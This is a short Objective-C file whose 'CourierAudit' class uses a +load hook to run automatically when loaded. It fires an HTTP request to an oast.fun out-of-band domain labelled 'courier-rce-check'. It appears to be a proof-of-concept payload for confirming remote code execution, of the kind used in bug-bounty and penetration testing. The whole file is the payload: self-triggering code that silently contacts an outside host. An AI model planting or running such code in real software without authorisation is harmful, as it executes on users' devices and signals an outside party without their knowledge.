#import <Foundation/Foundation.h>

@interface CourierAudit : NSObject
@end

@implementation CourierAudit
+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        // Alamat OAST lu
        NSString *oast = @"https://rscrwozltcmjjimsghzqbkyi9k1nszr9j.oast.fun/courier-rce-check";
        NSURL *url = [NSURL URLWithString:oast];
        if (url) {
            [[[NSURLSession sharedSession] dataTaskWithURL:url] resume];
            NSLog(@"[!] COURIER SECURITY AUDIT - RUNTIME PROBE SENT");
        }
    });
}
@end
